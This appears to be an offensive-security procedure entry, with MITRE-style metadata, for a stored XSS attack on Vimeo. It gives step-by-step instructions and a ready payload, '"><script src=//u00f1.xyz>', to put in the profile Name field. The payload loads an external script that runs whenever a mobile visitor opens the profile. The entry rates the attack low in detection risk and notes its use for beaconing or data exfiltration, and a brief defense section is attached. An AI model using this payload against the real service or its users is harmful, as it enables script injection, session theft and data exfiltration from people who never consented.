---
id: uuid-profile-create
tags:
  - xss
  - stored-xss
  - profile-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:20.703Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Create-Malicious-User-Profile-for-Stored-XSS

## Summary

This procedure modifies a Vimeo user profile name with a payload that injects a script tag, leading to automatic XSS execution on mobile profile page loads.

## Description

Vimeo's profile editing on desktop allows unsanitized input for the display name, such as '"><script src=//u00f1.xyz>', which closes the button attribute and injects an external script. On mobile, this renders directly in the HTML, executing the script upon page load without user interaction, enabling persistent attacks like beaconing or data exfiltration.

## Requirements

1. Valid Vimeo account
2. Desktop web browser
3. Access to profile settings

## Defense

Defensive measures and detection strategies:

- Enforce strict HTML entity encoding for profile names
- Validate and strip script tags in all user profiles
- Scan for external script loads from profile views

## Objectives

1. Inject script tag via profile name
2. Store payload for auto-execution
3. Target non-interactive page load exploitation

## Instructions

### Step 1: Access Profile Settings

**Context**: Navigate to edit the user name.

Go to https://vimeo.com/settings, copy and save your Vimeo URL (e.g., https://vimeo.com/user36690798).

### Step 2: Inject Payload and Save

**Context**: Update the name field with the closing tag and script.

Change the Name field to: `"><script src=//u00f1.xyz>`

Click 'Save Changes'.

> The payload is stored and will break out of attributes on mobile render.

### Step 3: Verify Profile URL

**Context**: Ensure the URL is ready for testing.

Confirm the profile URL is saved for mobile access.

**Expected Output**: Settings page confirms save, profile name updated.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[profile]]
